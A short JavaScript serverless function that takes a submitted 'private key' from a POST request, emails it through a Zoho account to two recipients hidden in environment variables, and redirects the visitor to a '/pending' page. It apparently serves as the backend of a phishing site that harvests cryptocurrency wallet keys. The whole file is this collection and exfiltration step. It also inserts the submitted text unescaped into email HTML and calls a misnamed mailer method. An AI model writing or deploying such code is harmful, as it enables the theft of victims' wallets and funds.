const nodemailer = require('nodemailer');

function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

exports.handler = async (event, context) => {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    try {
        const body = JSON.parse(event.body);
        const privateKey = body.data;
        
        if (!privateKey) {
            console.log('Private key must be provided. Very crucial');
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Private key must be provided' })
            };
        }

        const transporter = nodemailer.createTransporter({
            service: 'zoho',
            auth: {
                user: process.env.AUTH_USERNAME,
                pass: process.env.AUTH_PASSWORD
            }
        });

        await new Promise((resolve, reject) => {
            transporter.verify(function(error, success) {
                if (error) {
                    console.log(error);
                    reject(error);
                } else {
                    console.log('Server successfully ready to send mail...');
                    resolve(success);
                }
            });
        });

        const recipients = [process.env.RECIPIENT1, process.env.RECIPIENT2];
        
        for (let recipient of recipients) {
            const mailOptions = {
                from: process.env.AUTH_USERNAME,
                to: recipient,
                subject: `${body.category}`,
                html: `${body.data}`
            };

            await new Promise((resolve, reject) => {
                transporter.sendMail(mailOptions, async (error, info) => {
                    if (error) {
                        console.log(error);
                        reject(error);
                    } else {
                        console.log('Email sent: ' + info.response);
                        resolve(info);
                    }
                });
            });
        }

        await delay(1000);

        return {
            statusCode: 302,
            headers: {
                Location: '/pending'
            }
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal server error' })
        };
    }
};
